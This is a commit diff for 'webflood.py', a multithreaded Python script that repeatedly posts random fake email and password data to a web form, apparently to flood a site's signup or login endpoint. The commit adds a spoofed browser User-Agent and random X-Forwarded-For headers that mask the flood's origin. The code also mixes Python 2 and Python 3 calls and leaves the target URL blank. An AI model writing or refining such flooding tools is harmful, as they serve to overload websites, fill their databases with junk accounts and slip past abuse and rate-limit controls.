8e72492e06b5dbdb24bdc35ac9ffaa0aa89ac94e
cazzysoci <carielglobio@gmail.com>
2025-03-31 00:11:20 +0800

    Update webflood.py

--- webflood.py
+++ webflood.py
@@ -8,24 +8,25 @@
 #python3 webflood.py 5
 #(replace 5 with the number of threads you want to launch)
  
- 
 import urllib
-import urllib2 
+import urllib2
 import random
 import string
 from threading import Thread
 import sys
 import time
- 
+import socket
+import requests
+
 '''the number of threads'''
-num = int (sys.argv[1])
- 
+num = int(sys.argv[1])
+
 '''the number of minutes to run'''
-minute = int (sys.argv[2])
- 
+minute = int(sys.argv[2])
+
 '''the time to stop'''
 timeout = time.time() + 60*minute
- 
+
 def attack():
     while True:
         if time.time() <= timeout:
@@ -33,21 +34,25 @@ def attack():
                 'email': id_generator(random.randint(3,10))+"@"+id_generator(random.randint(3,10))+".com",
                 'password': id_generator(random.randint(3,10)),
             }
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
+                'X-Forwarded-For': '.'.join(str(random.randint(0, 255)) for _ in range(4))
+            }
             req = urllib2.Request(url="",
-                                  data=urllib.urlencode(data), 
-                                  headers={"Content-type": "application/x-www-form-urlencoded"}) 
+                                  data=urllib.urlencode(data),
+                                  headers=headers)
             response = urllib2.urlopen(req)
             the_page = response.read()
-            print 'flooded with '+ str(data)
-        else
+            print('flooded with ' + str(data))
+        else:
             break
- 
+
 def id_generator(size=12, chars=string.ascii_uppercase + string.digits):
     return ''.join(random.choice(chars) for _ in range(size))
- 
+
 if __name__ == "__main__":
     for k in range(0, num):
-        thread = Thread(target = attack)
+        thread = Thread(target=attack)
         thread.start()
-        print 'Launched thread '+str(k)
-        print
+        print('Launched thread ' + str(k))
+        print()
